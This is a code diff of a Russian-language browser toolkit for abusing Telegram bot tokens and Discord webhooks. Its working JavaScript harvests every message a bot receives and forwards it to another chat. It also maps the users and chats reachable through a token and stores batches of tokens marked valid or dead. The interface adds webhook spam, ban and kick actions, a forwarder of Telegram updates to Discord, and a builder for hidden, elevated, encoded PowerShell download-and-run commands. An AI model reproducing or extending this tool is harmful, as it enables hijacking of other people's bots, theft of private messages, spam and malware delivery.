-        <textarea id="hookUrls" placeholder="https://discord.com/api/webhooks/..."></textarea>
-      </div></div>
-      <div class="row"><div>
-        <label>Контент / JSON</label>
-        <textarea id="hookBody" placeholder='{"content":"hi"} или просто текст'></textarea>
-      </div></div>
-      <div class="row row2">
-        <div><label>Delay мс</label><input type="number" id="hookDelay" value="800"></div>
-        <div><label>Повторов</label><input type="number" id="hookRepeat" value="1" min="1" max="50"></div>
-      </div>
-      <button class="btn btn-primary" id="hookStart" type="button">Спам</button>
-      <button class="btn btn-ghost" id="hookStop" type="button" style="display:none">Стоп</button>
-      <div class="log" id="hookLog" style="margin-top:12px;display:none"></div>
+<!-- Chans -->
+<section class="panel" id="tab-chans">
+  <div class="card">
+    <h2>Каналы по ID</h2>
+    <div class="row"><div><label>Токен</label><input type="password" id="chanToken" autocomplete="off"></div></div>
+    <div class="row"><div><label>Chat IDs</label><textarea id="chanIds"></textarea></div></div>
+    <button class="btn btn-primary" id="chanScan" type="button">Скан</button>
+    <button class="btn-sm" type="button" id="chanFromUpdates" style="margin-top:8px">ID из getUpdates</button>
+    <div id="chanOut" style="margin-top:14px"></div>
+  </div>
+  <div class="card">
+    <h2>Действие</h2>
+    <div class="row row2">
+      <div><label>Chat</label><input type="text" id="actChat"></div>
+      <div><label>User id</label><input type="text" id="actUser"></div>
     </div>
-    <div class="card">
-      <h2>Пересылка в webhook</h2>
-      <p class="hint" style="margin-bottom:8px">Берёт последние TG updates и шлёт текст в Discord WH</p>
-      <div class="row"><div>
-        <label>TG токен</label>
-        <input type="password" id="hookTgToken" autocomplete="off">
-      </div></div>
-      <div class="row"><div>
-        <label>Discord WH URL</label>
-        <input type="text" id="hookFwdUrl">
-      </div></div>
-      <button class="btn btn-accent" id="hookFwd" type="button">Переслать updates → WH</button>
-      <div class="log" id="hookFwdLog" style="margin-top:12px;height:120px"></div>
+    <div class="row"><div><label>Текст / title</label><input type="text" id="actText"></div></div>
+    <div class="actions">
+      <button class="btn-sm" type="button" data-act="spam">Сообщение</button>
+      <button class="btn-sm" type="button" data-act="ban">Бан</button>
+      <button class="btn-sm" type="button" data-act="kick">Кик</button>
+      <button class="btn-sm" type="button" data-act="unban">Разбан</button>
+      <button class="btn-sm" type="button" data-act="title">Title</button>
+      <button class="btn-sm" type="button" data-act="invite">Invite</button>
     </div>
-  </section>
+    <div class="log" id="actLog" style="margin-top:12px;height:100px"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-check">
-    <div class="card">
-      <h2>Чекер токенов TG</h2>
-      <div class="row"><div><label>Токены</label><textarea id="chkTokens"></textarea></div></div>
-      <button class="btn btn-primary" id="chkTokenBtn" type="button">Check</button>
-      <div id="chkTokenOut" style="margin-top:12px"></div>
+<!-- Discord -->
+<section class="panel" id="tab-hook">
+  <div class="card">
+    <h2>Discord webhook spam</h2>
+    <div class="row"><div><label>URLs</label><textarea id="hookUrls"></textarea></div></div>
+    <div class="row"><div><label>Body</label><textarea id="hookBody"></textarea></div></div>
+    <div class="row row2">
+      <div><label>Delay</label><input type="number" id="hookDelay" value="800"></div>
+      <div><label>Repeat</label><input type="number" id="hookRepeat" value="1" min="1" max="50"></div>
     </div>
-    <div class="card">
-      <h2>Чекер webhook</h2>
-      <div class="row"><div><label>URLs</label><textarea id="chkHooks"></textarea></div></div>
-      <button class="btn btn-primary" id="chkHookBtn" type="button">Check</button>
-      <div id="chkHookOut" style="margin-top:12px"></div>
-    </div>
-  </section>
+    <button class="btn btn-primary" id="hookStart" type="button">Спам</button>
+    <button class="btn btn-ghost" id="hookStop" type="button" style="display:none">Стоп</button>
+    <div class="log" id="hookLog" style="margin-top:12px;display:none"></div>
+  </div>
+  <div class="card">
+    <h2>TG updates → Discord</h2>
+    <div class="row"><div><label>TG токен</label><input type="password" id="hookTgToken" autocomplete="off"></div></div>
+    <div class="row"><div><label>WH URL</label><input type="text" id="hookFwdUrl"></div></div>
+    <button class="btn btn-accent" id="hookFwd" type="button">Переслать</button>
+    <div class="log" id="hookFwdLog" style="margin-top:12px;height:120px"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-ps">
-    <div class="card">
-      <h2>Download + run</h2>
-      <div class="row"><div><label>File URL</label><input type="text" id="psUrl"></div></div>
-      <div class="row row2">
-        <div><label>Имя</label><input type="text" id="psName"></div>
-        <div><label>Куда</label>
-          <select id="psDir">
-            <option value="TEMP">%TEMP%</option>
-            <option value="LOCALAPPDATA">%LOCALAPPDATA%</option>
-            <option value="APPDATA">%APPDATA%</option>
-            <option value="DOWNLOADS">Downloads</option>
-            <option value="CUSTOM">Custom</option>
-          </select>
-        </div>
-      </div>
-      <div class="row" id="psCustomWrap" style="display:none">
-        <div><label>Path</label><input type="text" id="psCustom"></div>
-      </div>
-      <div class="cbs" style="margin:12px 0">
-        <label class="cb"><input type="checkbox" id="psHidden"> Hidden</label>
-        <label class="cb"><input type="checkbox" id="psSilent" checked> Hidden window</label>
-        <label class="cb"><input type="checkbox" id="psWait"> Wait</label>
-        <label class="cb"><input type="checkbox" id="psAdmin"> Elevated</label>
-        <label class="cb"><input type="checkbox" id="psMkdir" checked> Mkdir</label>
-        <label class="cb"><input type="checkbox" id="psB64"> -enc</label>
-      </div>
-      <div class="pathbox" id="psPath">path: —</div>
-      <button class="btn btn-primary" id="psBuild" type="button" style="margin-top:12px">Собрать</button>
-      <pre class="out" id="psOut">—</pre>
-      <div class="actions"><button class="btn-sm" type="button" id="psCopy">Copy</button></div>
+<!-- History -->
+<section class="panel" id="tab-hist">
+  <div class="card">
+    <h2>Локальная история</h2>
+    <p class="hint" style="margin-bottom:8px">Только этот браузер. Чужие устройства не видят.</p>
+    <div class="actions">
+      <button class="btn-sm" type="button" id="histRefresh">Обновить</button>
+      <button class="btn-sm" type="button" id="histClear">Очистить историю</button>
     </div>
-  </section>
+    <div class="log" id="histBox" style="margin-top:12px;height:320px"></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-codec">
-    <div class="card">
-      <h2>Encode / Decode</h2>
-      <div class="row"><div><label>In</label><textarea id="codecIn"></textarea></div></div>
-      <div class="row row2">
-        <div><label>Mode</label>
-          <select id="codecMode">
-            <option value="b64e">Base64 encode</option>
-            <option value="b64d">Base64 decode</option>
-            <option value="urlenc">URL encode</option>
-            <option value="urldec">URL decode</option>
-            <option value="hexe">Hex encode</option>
-            <option value="hexd">Hex decode</option>
-          </select>
-        </div>
-        <div style="display:flex;align-items:flex-end;gap:8px">
-          <button class="btn btn-primary" type="button" id="codecRun" style="width:auto">Run</button>
-          <button class="btn-sm" type="button" id="codecCopy">Copy</button>
-        </div>
+<!-- PS -->
+<section class="panel" id="tab-ps">
+  <div class="card">
+    <h2>Download + run</h2>
+    <div class="row"><div><label>URL</label><input type="text" id="psUrl"></div></div>
+    <div class="row row2">
+      <div><label>Имя</label><input type="text" id="psName"></div>
+      <div><label>Куда</label>
+        <select id="psDir">
+          <option value="TEMP">%TEMP%</option>
+          <option value="LOCALAPPDATA">%LOCALAPPDATA%</option>
+          <option value="APPDATA">%APPDATA%</option>
+          <option value="DOWNLOADS">Downloads</option>
+          <option value="CUSTOM">Custom</option>
+        </select>
       </div>
-      <div class="row"><div><label>Out</label><textarea id="codecOut" readonly></textarea></div></div>
     </div>
-  </section>
+    <div class="row" id="psCustomWrap" style="display:none"><div><label>Path</label><input type="text" id="psCustom"></div></div>
+    <div class="cbs" style="margin:12px 0">
+      <label class="cb"><input type="checkbox" id="psHidden"> Hidden</label>
+      <label class="cb"><input type="checkbox" id="psSilent" checked> Hidden window</label>
+      <label class="cb"><input type="checkbox" id="psWait"> Wait</label>
+      <label class="cb"><input type="checkbox" id="psAdmin"> Elevated</label>
+      <label class="cb"><input type="checkbox" id="psMkdir" checked> Mkdir</label>
+      <label class="cb"><input type="checkbox" id="psB64"> -enc</label>
+    </div>
+    <div class="pathbox" id="psPath">path: —</div>
+    <button class="btn btn-primary" id="psBuild" type="button" style="margin-top:12px">Собрать</button>
+    <pre class="out" id="psOut">—</pre>
+    <div class="actions"><button class="btn-sm" type="button" id="psCopy">Copy</button></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-keys">
-    <div class="card">
-      <h2>Ключи</h2>
-      <div class="row row3">
-        <div><label>Len</label><input type="number" id="keyLen" value="32" min="8" max="256"></div>
-        <div><label>Alpha</label>
-          <select id="keyAlpha">
-            <option value="hex">Hex</option>
-            <option value="alnum">Alnum</option>
-            <option value="uuid">UUID</option>
-          </select>
-        </div>
-        <div style="display:flex;align-items:flex-end">
-          <button class="btn btn-primary" type="button" id="keyGen">Gen</button>
-        </div>
+<section class="panel" id="tab-codec">
+  <div class="card">
+    <h2>Encode</h2>
+    <div class="row"><div><label>In</label><textarea id="codecIn"></textarea></div></div>
+    <div class="row row2">
+      <div><label>Mode</label>
+        <select id="codecMode">
+          <option value="b64e">Base64 encode</option>
+          <option value="b64d">Base64 decode</option>
+          <option value="urlenc">URL encode</option>
+          <option value="urldec">URL decode</option>
+          <option value="hexe">Hex encode</option>
+          <option value="hexd">Hex decode</option>
+        </select>
       </div>
-      <div class="row"><div><label>Out</label><input type="text" id="keyOut" readonly></div></div>
-      <div class="actions">
-        <button class="btn-sm" type="button" id="keyCopy">Copy</button>
-        <button class="btn-sm" type="button" id="keyGen5">×5</button>
+      <div style="display:flex;align-items:flex-end;gap:8px">
+        <button class="btn btn-primary" type="button" id="codecRun" style="width:auto">Run</button>
+        <button class="btn-sm" type="button" id="codecCopy">Copy</button>
       </div>
-      <pre class="out" id="keyList" style="display:none"></pre>
     </div>
-  </section>
+    <div class="row"><div><label>Out</label><textarea id="codecOut" readonly></textarea></div></div>
+  </div>
+</section>
 
-  <section class="panel" id="tab-psdec">
-    <div class="card">
-      <h2>PS Decode</h2>
-      <div class="row"><div><label>Cmd</label><textarea id="psDecIn" placeholder="powershell -enc ..."></textarea></div></div>
-      <button class="btn btn-primary" type="button" id="psDecRun">Decode</button>
-      <pre class="out" id="psDecOut">—</pre>
+<section class="panel" id="tab-keys">
+  <div class="card">
+    <h2>Ключи</h2>
+    <div class="row row3">
+      <div><label>Len</label><input type="number" id="keyLen" value="32"></div>
+      <div><label>Alpha</label>
+        <select id="keyAlpha"><option value="hex">Hex</option><option value="alnum">Alnum</option><option value="uuid">UUID</option></select>
+      </div>
+      <div style="display:flex;align-items:flex-end"><button class="btn btn-primary" type="button" id="keyGen">Gen</button></div>
     </div>
-  </section>
+    <div class="row"><div><label>Out</label><input type="text" id="keyOut" readonly></div></div>
+    <div class="actions"><button class="btn-sm" type="button" id="keyCopy">Copy</button><button class="btn-sm" type="button" id="keyGen5">×5</button></div>
+    <pre class="out" id="keyList" style="display:none"></pre>
+  </div>
+</section>
 
-  <footer>static · browser api</footer>
+<section class="panel" id="tab-psdec">
+  <div class="card">
+    <h2>PS Decode</h2>
+    <div class="row"><div><label>Cmd</label><textarea id="psDecIn"></textarea></div></div>
+    <button class="btn btn-primary" type="button" id="psDecRun">Decode</button>
+    <pre class="out" id="psDecOut">—</pre>
+  </div>
+</section>
+
+
+<section class="panel" id="tab-fcheck">
+  <div class="card">
+    <h2>Чекер файлов</h2>
+    <p class="hint" style="margin-bottom:10px">Локальный разбор + VirusTotal / Triage / MetaDefender / Joe. Ключи только в этом браузере.</p>
+    <div class="row"><div>
+      <label>Файл</label>
+      <input type="file" id="fcFile">
+    </div></div>
+    <div class="row row2">
+      <div>
+        <label>VirusTotal API key</label>
+        <input type="password" id="fcVtKey" placeholder="vt key" autocomplete="off">
+      </div>
+      <div>
+        <label>Triage / RF Sandbox key</label>
+        <input type="password" id="fcTriageKey" placeholder="Bearer token" autocomplete="off">
+      </div>
+    </div>
+    <div class="row row2">
+      <div>
+        <label>MetaDefender key</label>
+        <input type="password" id="fcMdKey" placeholder="apikey" autocomplete="off">
+      </div>
+      <div>
+        <label>Joe Sandbox key</label>
+        <input type="password" id="fcJoeKey" placeholder="webapi key" autocomplete="off">
+      </div>
+    </div>
+    <div class="row"><div>
+      <label>Triage API base</label>
+      <select id="fcTriageBase">
+        <option value="https://tria.ge/api/v0">tria.ge</option>
+        <option value="https://sandbox.recordedfuture.com/api/v0">RF sandbox</option>
+        <option value="https://us-sandbox.recordedfuture.com/api/v0">RF US sandbox</option>
+        <option value="https://private.tria.ge/api/v0">private.tria.ge</option>
+      </select>
+    </div></div>
+    <div class="cbs" style="margin-bottom:12px">
+      <label class="cb"><input type="checkbox" id="fcDoVt" checked> VirusTotal</label>
+      <label class="cb"><input type="checkbox" id="fcDoTriage"> Triage/RF</label>
+      <label class="cb"><input type="checkbox" id="fcDoMd"> MetaDefender</label>
+      <label class="cb"><input type="checkbox" id="fcDoJoe"> Joe</label>
+      <label class="cb"><input type="checkbox" id="fcDoLocal" checked> Локальный IOC</label>
+    </div>
+    <button class="btn btn-primary" id="fcRun" type="button">Проверить</button>
+    <div id="fcStatus" class="hint" style="margin-top:10px"></div>
+    <div id="fcSummary" style="margin-top:12px"></div>
+    <div class="tree" id="fcTree" style="margin-top:12px"></div>
+    <div class="ioc-box" id="fcIoc" style="display:none"></div>
+  </div>
+  <div class="card">
+    <h2>История чеков</h2>
+    <div class="actions">
+      <button class="btn-sm" type="button" id="fcHistRefresh">Обновить</button>
+      <button class="btn-sm" type="button" id="fcHistClear">Очистить</button>
+    </div>
+    <div id="fcHist" style="margin-top:12px"></div>
+  </div>
+</section>
+
+<footer>localStorage · этот браузер</footer>
 </div>
 <div class="toast" id="toast">ok</div>
 
 <script>
 const $ = id => document.getElementById(id);
 const toast = m => { const t=$('toast'); t.textContent=m||'ok'; t.classList.add('on'); clearTimeout(t._t); t._t=setTimeout(()=>t.classList.remove('on'),1400); };
-async function copyText(s) {
-  try { await navigator.clipboard.writeText(s); } catch {
-    const ta=document.createElement('textarea'); ta.value=s; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
-  }
-  toast('copy');
-}
+async function copyText(s){ try{ await navigator.clipboard.writeText(s);}catch{ const ta=document.createElement('textarea'); ta.value=s; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); } toast('copy'); }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 function esc(s){ return String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
-function tok(){ return ($('token').value||$('spamToken').value||$('profToken').value||$('chanToken').value||'').trim(); }
+
+const LS_VAULT='tk_vault_v1';
+const LS_HIST='tk_hist_v1';
+function loadVault(){ try{ return JSON.parse(localStorage.getItem(LS_VAULT)||'[]'); }catch{ return []; } }
+function saveVault(v){ localStorage.setItem(LS_VAULT, JSON.stringify(v)); }
+function hist(action, meta){
+  try{
+    const h=JSON.parse(localStorage.getItem(LS_HIST)||'[]');
+    h.unshift({t:Date.now(), action, meta:meta||{}});
+    localStorage.setItem(LS_HIST, JSON.stringify(h.slice(0,500)));
+  }catch{}
+}
+function renderHist(){
+  const h=JSON.parse(localStorage.getItem(LS_HIST)||'[]');
+  $('histBox').innerHTML=h.length? h.map(x=>`<div class="info">${new Date(x.t).toLocaleString('ru-RU')} · <b>${esc(x.action)}</b> ${esc(JSON.stringify(x.meta).slice(0,120))}</div>`).join('') : '<div class="info">пусто</div>';
+}
 
 document.querySelectorAll('.tab').forEach(btn=>{
   btn.addEventListener('click',()=>{
@@ -613,348 +498,379 @@ document.querySelectorAll('.tab').forEach(btn=>{
     document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
     btn.classList.add('on');
     $('tab-'+btn.dataset.tab).classList.add('on');
+    if(btn.dataset.tab==='valid') renderVault();
+    if(btn.dataset.tab==='hist') renderHist();
   });
 });
 
+/* token hint */
 let botTimer=null;
 $('token').addEventListener('input',()=>{
-  const val=$('token').value.trim();
-  const hint=$('botHint');
-  clearTimeout(botTimer);
-  if(!val.includes(':')){ hint.textContent=''; return; }
-  hint.textContent='...';
+  const val=$('token').value.trim(); clearTimeout(botTimer);
+  if(!val.includes(':')){ $('botHint').textContent=''; return; }
+  $('botHint').textContent='...';
   botTimer=setTimeout(async()=>{
-    try{
-      const r=await fetch('https://api.telegram.org/bot'+val+'/getMe');
-      const j=await r.json();
-      hint.textContent=j.ok?('@'+j.result.username+' — '+j.result.first_name):'invalid';
-    }catch{ hint.textContent=''; }
-  },500);
+    try{ const j=await (await fetch('https://api.telegram.org/bot'+val+'/getMe')).json();
+      $('botHint').textContent=j.ok?('@'+j.result.username+' — '+j.result.first_name):'invalid';
+    }catch{ $('botHint').textContent=''; }
+  },400);
 });
 
+/* forward - same as before */
 let stopFlag=false, forwarded=0, skipped=0, errors=0;
-function logLine(cls,msgId,text){
-  const box=$('logBox');
-  const div=document.createElement('div');
-  div.innerHTML=`<span class="info">${new Date().toLocaleTimeString('ru-RU')}</span> <span class="${cls}">#${msgId}: ${esc(text)}</span>`;
-  box.appendChild(div); box.scrollTop=box.scrollHeight;
-}
-function updateStats(cur,total){
-  $('progressFill').style.width=(total?Math.round(cur/total*100):0)+'%';
-  $('sCurrent').textContent=cur;
-  $('sForwarded').textContent=forwarded;
-  $('sSkipped').textContent=skipped;
-  $('sErrors').textContent=errors;
-}
+function logLine(cls,id,text){ const b=$('logBox'); const d=document.createElement('div'); d.innerHTML=`<span class="info">${new Date().toLocaleTimeString('ru-RU')}</span> <span class="${cls}">#${id}: ${esc(text)}</span>`; b.appendChild(d); b.scrollTop=b.scrollHeight; }
+function updateStats(c,t){ $('progressFill').style.width=(t?Math.round(c/t*100):0)+'%'; $('sCurrent').textContent=c; $('sForwarded').textContent=forwarded; $('sSkipped').textContent=skipped; $('sErrors').textContent=errors; }
 
 $('startBtn').addEventListener('click', async ()=>{
   const token=$('token').value.trim();
-  let fromChat=$('fromChat').value.trim();
-  let toChat=$('toChat').value.trim();
-  const msgFrom=parseInt($('msgFrom').value,10);
-  const msgTo=parseInt($('msgTo').value,10);
-  const delay=Math.max(80,parseInt($('delay').value,10)||300);
+  let fromChat=$('fromChat').value.trim(), toChat=$('toChat').value.trim();
+  const msgFrom=+($('msgFrom').value), msgTo=+($('msgTo').value), delay=Math.max(80,+$('delay').value||300);
   const allMode=$('fwdAll').checked || !fromChat;
   if(!token) return alert('токен');
-  stopFlag=false; forwarded=0; skipped=0; errors=0;
-  $('startBtn').disabled=true;
-  $('stopBtn').style.display='block';
-  $('progressCard').style.display='block';
-  $('progressTitle').textContent='Работает';
-  $('logBox').innerHTML='';
-
+  stopFlag=false; forwarded=skipped=errors=0;
+  $('startBtn').disabled=true; $('stopBtn').style.display='block'; $('progressCard').style.display='block';
+  $('progressTitle').textContent='Работает'; $('logBox').innerHTML='';
+  hist('forward_start',{allMode});
   if(allMode){
-    logLine('info','—','auto: getUpdates → forward');
+    logLine('info','—','auto updates');
     let offset=0;
     while(!stopFlag){
       try{
-        const r=await fetch(`https://api.telegram.org/bot${token}/getUpdates?timeout=20&offset=${offset}`);
-        const data=await r.json();
-        if(!data.ok){ logLine('err','—',data.description||'fail'); break; }
+        const data=await (await fetch(`https://api.telegram.org/bot${token}/getUpdates?timeout=20&offset=${offset}`)).json();
+        if(!data.ok){ logLine('err','—',data.description||''); break; }
         for(const u of data.result){
           offset=u.update_id+1;
-          const msg=u.message||u.channel_post||u.edited_message;
-          if(!msg) continue;
-          const src=msg.chat.id;
-          const mid=msg.message_id;
-          const dest=toChat||src;
+          const msg=u.message||u.channel_post||u.edited_message; if(!msg) continue;
+          const dest=toChat||msg.chat.id;
           try{
-            const fr=await fetch(`https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(dest)}&from_chat_id=${src}&message_id=${mid}`);
-            const fj=await fr.json();
-            if(fj.ok){ forwarded++; logLine('ok',mid,src+' → '+dest); }
-            else { errors++; logLine('err',mid,fj.description||''); }
+            const fj=await (await fetch(`https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(dest)}&from_chat_id=${msg.chat.id}&message_id=${msg.message_id}`)).json();
+            if(fj.ok){ forwarded++; logLine('ok',msg.message_id, msg.chat.id+'→'+dest); } else { errors++; logLine('err',msg.message_id,fj.description||''); }
           }catch{ errors++; }
-          updateStats(forwarded+errors, forwarded+errors+1);
-          await sleep(delay);
-          if(stopFlag) break;
+          updateStats(forwarded+errors,forwarded+errors+1); await sleep(delay); if(stopFlag) break;
         }
-      }catch(e){ logLine('err','—','network'); await sleep(2000); }
+      }catch{ logLine('err','—','net'); await sleep(2000); }
     }
   } else {
     if(!toChat) toChat=fromChat;
     const total=msgTo-msgFrom+1;
-    logLine('info','—',`range ${msgFrom}..${msgTo}`);
-    for(let id=msgFrom; id<=msgTo; id++){
-      if(stopFlag) break;
-      updateStats(id-msgFrom,total);
+    for(let id=msgFrom;id<=msgTo;id++){
+      if(stopFlag) break; updateStats(id-msgFrom,total);
       try{
-        const url=`https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(toChat)}&from_chat_id=${encodeURIComponent(fromChat)}&message_id=${id}`;
-        const res=await fetch(url);
-        const data=await res.json();
+        const data=await (await fetch(`https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(toChat)}&from_chat_id=${encodeURIComponent(fromChat)}&message_id=${id}`)).json();
         if(data.ok){ forwarded++; logLine('ok',id,'ok'); }
         else {
-          const desc=data.description||'';
-          if(/not found|MESSAGE_ID_INVALID/i.test(desc)) skipped++;
-          else if(/Too Many Requests/i.test(desc)){
-            const wait=(data.parameters&&data.parameters.retry_after?data.parameters.retry_after:5)*1000;
-            logLine('err',id,'flood '+wait/1000+'s'); await sleep(wait); id--;
-          } else if(/CHAT_NOT_FOUND|Forbidden|blocked/i.test(desc)){ logLine('err',id,desc); break; }
-          else { errors++; logLine('err',id,desc); }
+          const d=data.description||'';
+          if(/not found|MESSAGE_ID_INVALID/i.test(d)) skipped++;
+          else if(/Too Many Requests/i.test(d)){ const w=(data.parameters&&data.parameters.retry_after?data.parameters.retry_after:5)*1000; await sleep(w); id--; }
+          else if(/Forbidden|CHAT_NOT_FOUND|blocked/i.test(d)){ logLine('err',id,d); break; }
+          else { errors++; logLine('err',id,d); }
         }
-      }catch{ errors++; logLine('err',id,'network'); }
-      updateStats(id-msgFrom+1,total);
-      await sleep(delay);
+      }catch{ errors++; }
+      updateStats(id-msgFrom+1,total); await sleep(delay);
     }
   }
-  $('progressFill').style.width='100%';
-  $('progressTitle').textContent=stopFlag?'Стоп':'Готово';
-  $('startBtn').disabled=false;
-  $('stopBtn').style.display='none';
-  $('stopBtn').disabled=false;
-  $('stopBtn').textContent='Стоп';
+  $('progressTitle').textContent=stopFlag?'Стоп':'Готово'; $('startBtn').disabled=false; $('stopBtn').style.display='none'; $('stopBtn').disabled=false; $('stopBtn').textContent='Стоп';
+  hist('forward_end',{forwarded,skipped,errors});
 });
-$('stopBtn').addEventListener('click',()=>{ stopFlag=true; $('stopBtn').textContent='...'; $('stopBtn').disabled=true; });
+$('stopBtn').addEventListener('click',()=>{ stopFlag=true; $('stopBtn').disabled=true; });
 
-$('loadMsgs').addEventListener('click', async ()=>{
-  const token=$('token').value.trim();
-  const list=$('msgList');
-  if(!token){ list.innerHTML='<div class="hint">токен</div>'; return; }
-  $('msgsStatus').textContent='...';
+/* AUDIT */
+$('auditRun').addEventListener('click', async ()=>{
+  const token=($('auditToken').value.trim()||$('token').value.trim());
+  const out=$('auditOut'); out.innerHTML='<div class="hint">...</div>';
+  if(!token) return alert('токен');
+  hist('audit',{token:token.slice(0,12)+'…'});
+  let html='';
   try{
-    const r=await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=50&timeout=0`);
-    const data=await r.json();
-    if(!data.ok){ list.innerHTML=`<div class="hint">${esc(data.description||'')}</div>`; return; }
-    const updates=data.result.filter(u=>u.message||u.edited_message||u.channel_post).reverse();
-    $('msgsStatus').textContent=updates.length+' шт';
-    if(!updates.length){ list.innerHTML='<div class="hint">пусто</div>'; return; }
-    list.innerHTML=updates.map(u=>{
-      const msg=u.message||u.edited_message||u.channel_post;
-      const from=msg.from?[msg.from.first_name,msg.from.last_name].filter(Boolean).join(' '):(msg.chat&&msg.chat.title)||'chat';
-      const text=msg.text||msg.caption||'[media]';
-      const time=new Date(msg.date*1000).toLocaleString('ru-RU');
-      return `<div class="msg-item"><div><div class="msg-from">${esc(from)} · ${esc(String(msg.chat.id))}</div><div class="msg-body">${esc(text)}</div></div><div class="msg-time">${esc(time)}</div></div>`;
-    }).join('');
-  }catch(e){ list.innerHTML=`<div class="hint">${esc(e.message)}</div>`; }
+    const me=await (await fetch('https://api.telegram.org/bot'+token+'/getMe')).json();
+    if(!me.ok){ out.innerHTML=`<div class="msg-item"><span class="badge status-bad">INVALID</span> ${esc(me.description||'')}</div>`; return; }
+    html+=`<div class="chan-card"><h3>@${esc(me.result.username||'')} · ${esc(me.result.first_name||'')}</h3>
+      <div class="chan-meta">id ${me.result.id} · bot ${me.result.is_bot}</div>
+      <div class="chan-meta">can_join_groups: ${me.result.can_join_groups} · read_group: ${me.result.can_read_all_group_messages} · inline: ${me.result.supports_inline_queries}</div>
+      <div class="hint">Владелец BotFather API не отдаёт. Видно только данные бота.</div></div>`;
+    try{
+      const wh=await (await fetch('https://api.telegram.org/bot'+token+'/getWebhookInfo')).json();
+      if(wh.ok) html+=`<div class="chan-card"><h3>Webhook</h3><div class="chan-meta">url: ${esc(wh.result.url||'—')}</div>
+        <div class="chan-meta">pending: ${wh.result.pending_update_count} · last_error: ${esc(wh.result.last_error_message||'—')}</div></div>`;
+    }catch{}
+    const upd=await (await fetch('https://api.telegram.org/bot'+token+'/getUpdates?limit=100')).json();
+    const users=new Map(), chats=new Map();
+    if(upd.ok){
+      for(const u of upd.result){
+        const m=u.message||u.channel_post||u.edited_message;
+        if(m&&m.from) users.set(m.from.id, {id:m.from.id, username:m.from.username, name:[m.from.first_name,m.from.last_name].filter(Boolean).join(' '), start: !!(m.text&&/^\/start/i.test(m.text))});
+        if(m&&m.chat) chats.set(m.chat.id, {id:m.chat.id, type:m.chat.type, title:m.chat.title||m.chat.username||m.chat.first_name||String(m.chat.id)});
+        if(u.my_chat_member){
+          const c=u.my_chat_member.chat;
+          chats.set(c.id, {id:c.id, type:c.type, title:c.title||c.username||String(c.id), status:u.my_chat_member.new_chat_member.status});
+        }
+      }
+    }
+    html+=`<div class="chan-card"><h3>Кто писал /start (из updates)</h3>`;
+    if(!users.size) html+=`<div class="chan-meta">пусто — напишите боту /start</div>`;
+    for(const u of users.values()) html+=`<div class="chan-meta">${u.start?'[start] ':''}${esc(u.name)} @${esc(u.username||'—')} id ${u.id}</div>`;
+    html+=`</div><div class="chan-card"><h3>Чаты из updates / my_chat_member</h3>`;
+    if(!chats.size) html+=`<div class="chan-meta">пусто — добавьте бота в канал/группу</div>`;
+    for(const c of chats.values()){
+      html+=`<div class="chan-meta"><b>${esc(c.title)}</b> · ${esc(c.type)} · id ${c.id}${c.status?' · status '+esc(c.status):''}</div>`;
+    }
+    html+=`<div class="hint">Полный список каналов API не даёт. Только то, что пришло в updates.</div></div>`;
+    out.innerHTML=html;
+    window._lastAudit={token, me:me.result, users:[...users.values()], chats:[...chats.values()]};
+  }catch(e){ out.innerHTML=`<div class="err">${esc(e.message)}</div>`; }
+});
+$('auditSave').addEventListener('click', async ()=>{
+  const token=($('auditToken').value.trim()||$('token').value.trim());
+  if(!token) return;
+  const j=await (await fetch('https://api.telegram.org/bot'+token+'/getMe')).json();
+  if(!j.ok) return toast('invalid');
+  const v=loadVault();
+  if(v.some(x=>x.token===token)) return toast('уже есть');
+  v.push({token, username:j.result.username, name:j.result.first_name, id:j.result.id, group:'default', note:'', valid:true, ts:Date.now()});
+  saveVault(v); hist('vault_add',{username:j.result.username}); toast('saved'); renderVault();
 });
 
+/* VAULT */
+function renderVault(){
+  const v=loadVault();
+  const box=$('vaultList');
+  if(!v.length){ box.innerHTML='<div class="hint">пусто</div>'; return; }
+  box.innerHTML=v.map((b,i)=>`<div class="bot-row">
+    <div>
+      <span class="badge ${b.valid?'status-ok':'status-bad'}">${b.valid?'VALID':'DEAD'}</span>
+      <span class="group-tag">${esc(b.group||'default')}</span>
+      <b>@${esc(b.username||'?')}</b>
+      <div class="msg-from">${esc(b.name||'')} · id ${b.id||'—'} · ${esc(b.note||'')}</div>
+      <code>${esc(b.token.slice(0,16))}…</code>
+    </div>
+    <div class="actions">
+      <button class="btn-sm" type="button" data-vdel="${i}">del</button>
+      <button class="btn-sm" type="button" data-vuse="${i}">в токен</button>
+    </div>
+  </div>`).join('');
+  box.querySelectorAll('[data-vdel]').forEach(btn=>btn.addEventListener('click',()=>{
+    const v=loadVault(); v.splice(+btn.dataset.vdel,1); saveVault(v); renderVault();
+  }));
+  box.querySelectorAll('[data-vuse]').forEach(btn=>btn.addEventListener('click',()=>{
+    const v=loadVault(); const t=v[+btn.dataset.vuse]; if(t){ $('token').value=t.token; $('auditToken').value=t.token; $('profToken').value=t.token; toast('@'+t.username); }
+  }));
+}
+$('vaultAdd').addEventListener('click', async ()=>{
+  const token=$('vaultAddToken').value.trim();
+  if(!token) return;
+  const j=await (await fetch('https://api.telegram.org/bot'+token+'/getMe')).json();
+  const v=loadVault();
+  if(v.some(x=>x.token===token)) return toast('уже');
+  v.push({token, username:j.ok?j.result.username:'?', name:j.ok?j.result.first_name:'', id:j.ok?j.result.id:null, group:$('vaultGroup').value.trim()||'default', note:$('vaultNote').value.trim(), valid:!!j.ok, ts:Date.now()});
+  saveVault(v); hist('vault_add',{username:j.ok?j.result.username:'?'}); renderVault(); toast(j.ok?'valid':'dead');
+});
+$('vaultRecheck').addEventListener('click', async ()=>{
+  const v=loadVault();
+  for(const b of v){
